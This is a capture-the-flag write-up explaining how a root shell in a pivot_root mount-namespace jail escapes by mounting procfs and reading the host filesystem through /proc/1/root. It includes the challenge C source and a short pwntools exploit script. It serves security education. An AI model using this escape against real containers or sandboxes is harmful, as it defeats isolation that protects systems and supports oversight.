---
title: "Mount Namespace Escape via Procfs"
description: "Escaping a hardened mount namespace by mounting procfs and accessing the host's root directory through process 1's root link."
date: "2026-01-04"
order: 15
draft: false
---

# Mount Namespace Escape via Procfs

## Challenge Source Code

```c
#define _GNU_SOURCE 1
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  for (int i = 3; i < 10000; i++)
    close(i);

  char new_root[] = "/tmp/jail-XXXXXX";
  char old_root[1024];

  assert(geteuid() == 0);

  // Create a new mount namespace
  assert(unshare(CLONE_NEWNS) != -1);

  // Create the jail root
  assert(mkdtemp(new_root) != NULL);

  // Change / to a private mount to allow pivot_root
  assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

  // Bind-mount the new root over itself
  assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

  // Create a directory for the old root
  snprintf(old_root, sizeof(old_root), "%s/old", new_root);
  assert(mkdir(old_root, 0777) != -1);

  // Pivot the root filesystem
  assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

  // Bind-mount essential system directories
  assert(mkdir("/bin", 0755) != -1);
  assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
  assert(mkdir("/usr", 0755) != -1);
  assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
  assert(mkdir("/lib", 0755) != -1);
  assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
  assert(mkdir("/lib64", 0755) != -1);
  assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

  // Unmount the old root directory
  assert(umount2("/old", MNT_DETACH) != -1);
  assert(rmdir("/old") != -1);

  setresuid(0, 0, 0);
  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
}
```

## Vulnerability Analysis

This level improves the sandbox isolation by explicitly unmounting the old root directory (`/old`) after the pivot. This prevents the simple path traversal used in the previous level.

However, since we are running as `root` within the namespace and there are no restrictive seccomp filters or LSM profiles (like AppArmor/SELinux), we can mount the **proc filesystem** (`procfs`).

`procfs` provides a window into the kernel's view of all processes. Crucially, `/proc/<pid>/root` is a symbolic link to the root directory of a process. In many environments, process 1 (init) or other processes started before the namespace was restricted still have the original host root as their root directory.

## Exploitation Plan

1. **Mount Proc:** Create a new directory `/p` and mount the `proc` filesystem to it.
2. **Access Host Root:** Traverse process 1's root link to reach the host's filesystem: `/p/1/root/`.
3. **Read Flag:** Read the real flag located at `/p/1/root/flag`.

## Exploit Script

The following script interacts with the shell spawned inside the jail. It executes standard Linux commands to mount `procfs` and access the host root.

```python
from pwn import *

# Set the target binary
elf = context.binary = ELF("./challenge", checksec=False)

# Start the process
p = process(elf.path)

# 1. Create a directory for proc (in / which exists)
p.sendline(b"mkdir /p")

# 2. Mount the proc filesystem
p.sendline(b"mount -t proc proc /p")

# 3. Read the flag from the host root via /proc/1/root
p.sendline(b"cat /p/1/root/flag")

# 4. Exit the shell
p.sendline(b"exit")

# Receive the output and print the flag
print(p.recvall(timeout=2).decode())
```
